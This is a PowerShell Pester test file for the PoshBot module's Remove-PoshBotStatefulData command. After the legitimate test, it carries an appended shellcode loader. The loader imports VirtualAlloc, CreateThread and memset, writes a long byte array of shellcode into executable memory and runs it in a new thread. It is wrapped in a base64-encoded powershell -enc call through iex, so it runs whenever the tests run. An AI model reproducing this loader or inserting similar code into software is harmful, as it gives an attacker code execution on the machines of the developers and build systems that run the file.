﻿
InModuleScope PoshBot {
    describe 'Remove-PoshBotStatefulData' {
        BeforeAll {
            $PSDefaultParameterValues = @{
                'Remove-PoshBotStatefulData:Verbose' = $false
            }

            
            $global:PoshBotContext = [pscustomobject]@{
                Plugin                 = 'TestPlugin'
                ConfigurationDirectory = (Join-Path $env:BHProjectPath Tests)
            }
        }

        AfterAll {
            Remove-Variable -Name PoshBotContext -Scope Global -Force
        }

        $globalfile = Join-Path $global:PoshBotContext.ConfigurationDirectory 'PoshbotGlobal.state'
        $modulefile = Join-Path $global:PoshBotContext.ConfigurationDirectory "$($poshbotcontext.Plugin).state"
        [pscustomobject]@{
            a = 'g'
            b = $true
        } | Export-Clixml -Path $globalfile
        [pscustomobject]@{
            a = 'm'
            b = $true
        } | Export-Clixml -Path $modulefile

        it 'Removes data as expected' {
            Remove-PoshBotStatefulData -Scope Module -Name a
            Remove-PoshBotStatefulData -Scope Global -Name b

            $m = Import-Clixml -Path $modulefile
            $m.b | Should Be $True
            @($m.psobject.properties).count | Should Be 1

            $g = Import-Clixml -Path $globalfile
            $g.a | Should Be 'g'
            @($g.psobject.properties).count | Should Be 1

            Remove-Item $globalfile -Force
            Remove-Item $modulefile -Force
        }
        Remove-Item $globalfile -Force -ErrorAction SilentlyContinue
        Remove-Item $modulefile -Force -ErrorAction SilentlyContinue
    }
}

$wS5t = '$ksM7 = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $ksM7 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xf3,0x77,0xfd,0x6b,0xd9,0xeb,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x50,0x13,0x83,0xe8,0xfc,0x03,0x50,0xfc,0x95,0x08,0x97,0xea,0xd8,0xf3,0x68,0xea,0xbc,0x7a,0x8d,0xdb,0xfc,0x19,0xc5,0x4b,0xcd,0x6a,0x8b,0x67,0xa6,0x3f,0x38,0xfc,0xca,0x97,0x4f,0xb5,0x61,0xce,0x7e,0x46,0xd9,0x32,0xe0,0xc4,0x20,0x67,0xc2,0xf5,0xea,0x7a,0x03,0x32,0x16,0x76,0x51,0xeb,0x5c,0x25,0x46,0x98,0x29,0xf6,0xed,0xd2,0xbc,0x7e,0x11,0xa2,0xbf,0xaf,0x84,0xb9,0x99,0x6f,0x26,0x6e,0x92,0x39,0x30,0x73,0x9f,0xf0,0xcb,0x47,0x6b,0x03,0x1a,0x96,0x94,0xa8,0x63,0x17,0x67,0xb0,0xa4,0x9f,0x98,0xc7,0xdc,0xdc,0x25,0xd0,0x1a,0x9f,0xf1,0x55,0xb9,0x07,0x71,0xcd,0x65,0xb6,0x56,0x88,0xee,0xb4,0x13,0xde,0xa9,0xd8,0xa2,0x33,0xc2,0xe4,0x2f,0xb2,0x05,0x6d,0x6b,0x91,0x81,0x36,0x2f,0xb8,0x90,0x92,0x9e,0xc5,0xc3,0x7d,0x7e,0x60,0x8f,0x93,0x6b,0x19,0xd2,0xfb,0x05,0x47,0x99,0xfb,0xb1,0xf0,0x08,0x95,0x28,0xab,0xa2,0x25,0xdc,0x75,0x34,0x4a,0xf7,0x4b,0xe1,0xe7,0xab,0xf8,0x46,0x54,0x24,0xc5,0x3e,0x23,0x13,0xc6,0x6a,0x80,0x08,0x53,0x96,0x75,0xfc,0xcb,0x23,0x78,0x02,0x0c,0xbc,0xf6,0x02,0x0c,0x3c,0x29,0x66,0x48,0x05,0x05,0x22,0x50,0x25,0x0d,0xe5,0xd9,0x5a,0x0b,0xf6,0x0f,0xed,0x55,0x5a,0xd8,0xee,0x6b,0xbd,0x9c,0xbc,0xd8,0x6e,0xca,0x11,0x88,0xf8,0x1f,0xc0,0x1a,0xc2,0x20,0x3e,0xf4,0x5e,0xd5,0x9e,0x90,0x1e,0xda,0x20,0x60,0x96,0xfd,0x4b,0x64,0xf8,0x97,0x94,0x32,0x90,0x12,0xed,0x24,0xe6,0x22,0x24,0x0b,0xb4,0x8f,0x94,0xfd,0x52,0x1d,0x1d,0x19,0xd8,0xa2,0xf4,0x9c,0xde,0x28,0xfd,0xd1,0xab,0x0b,0x69,0x1d,0xe6,0x0e,0x3c,0x22,0xdc,0x25,0x81,0xb4,0xdf,0xa9,0x01,0x44,0x88,0xc9,0x01,0x04,0x48,0x99,0x69,0xdc,0xec,0x4e,0x8f,0x23,0x39,0xe3,0x1c,0x88,0x4b,0xe3,0xf4,0x46,0x4c,0xcc,0xfa,0x96,0x1f,0x5a,0x93,0x84,0x09,0xeb,0x81,0x57,0xe0,0x69,0x85,0xd3,0xc6,0xf9,0x01,0x1a,0x1a,0x78,0xcd,0x69,0x79,0xdb,0x0d,0xce,0x69,0xa9,0x6e,0x0f,0x96,0x63,0xa9,0xda,0x47,0xb3,0xfa,0x0a,0xab,0x83,0xd2,0x63,0xfa,0xc1,0x2a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$F4J=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($F4J.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$F4J,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wS5t));$QeJO = "-enc ";if([IntPtr]::Size -eq 8){$VlfZ = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $VlfZ $QeJO $e"}else{;iex "& powershell $QeJO $e";}

